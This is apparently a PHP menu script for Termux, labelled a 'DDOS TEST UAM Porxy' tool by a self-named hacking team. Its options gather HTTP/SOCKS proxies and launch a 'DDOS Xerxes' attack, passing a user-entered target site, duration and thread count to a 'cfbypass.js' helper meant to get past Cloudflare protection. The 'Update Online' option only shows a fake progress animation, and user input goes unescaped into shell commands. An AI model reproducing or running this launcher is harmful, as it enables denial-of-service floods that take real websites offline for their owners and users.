#!/data/data/com.termux/files/usr/bin/php
<?php
if(strtolower(substr(PHP_OS, 0, 3)) == "win") {
$bersih="cls";
} else {
$bersih="clear";
}
system($bersih);
$green  = "\e[92m";
$red    = "\e[91m";
$yellow = "\e[93m";
$blue   = "\e[36m";
echo "\n$yellow
 ____        _     _           ____        _
/ ___| _ __ (_) __| | ___ _ __| __ )  ___ | |_
\___ \| '_ \| |/ _` |/ _ \ '__|  _ \ / _ \| __|
 ___) | |_) | | (_| |  __/ |  | |_) | (_) | |_
|____/| .__/|_|\__,_|\___|_|  |____/ \___/ \__|
      |_|";
echo "\n$blue
Tools   : DDOS TEST UAM Porxy
Author  : Scriptking SCK
Code    : PHP
FB      : SCK
Team    : NONAME
Version : 3.1 ( Alpha )\n";
echo "$red================================$green\n";
echo "=== MENU====\n";
echo "1) New Proxy\n";
echo "2) DDOS Xerxes\n";
echo "3) Update Online\n";
echo "===========\n";
function input($echo) {
    echo "$echo --> ";
}
input("Number");
$menu = trim(fgets(STDIN));

if ($menu == 3){
system('clear');
sleep(1);
echo "~~~~\n";
sleep(2);
system('clear');
echo "~~~~~~~\n";
sleep(3);
system('clear');
echo "~~~~~~~~~~~\n";
sleep(4);
system('clear');
echo "~~~~~~~~~~~~~~~ [√]\n";
sleep(4);
system('clear');
}

if ($menu == 1){
system('clear');
echo "1) http\n";
echo "2) sock4\n";
echo "3) sock5\n";
echo "4) Home\n";
input("search");
$mod = trim(fgets(STDIN));
	if ($mod == 1){
		system("node proxy.js http");
		}
	if ($mod == 2){
		system("node proxy.js sock4");
		}
	if ($mod == 3){
		system("node proxy.js sock5");
        }
    if ($mod ==4){
    	system("php menu.php");
      }
sleep(1);
system('clear');
}

if ($menu == 2){
	sleep(1);
	system('clear');
	echo "1) http\n";
	echo "2) sock4\n";
	echo "3) sock5\n";
	input("search");
   $j = trim(fgets(STDIN));
   if ($j == 1){
   	input("Web\n");
	$web = trim(fgets(STDIN));
	input("Time\n");
	$time = trim(fgets(STDIN));
	input("Trade\n");
	$list = trim(fgets(STDIN));
	//input("proxy\n");
	//$proxyl = trim(fgets(STDIN));
	system("node cfbypass.js '$web' '$time' '$list' http.txt");
    }
   }
?>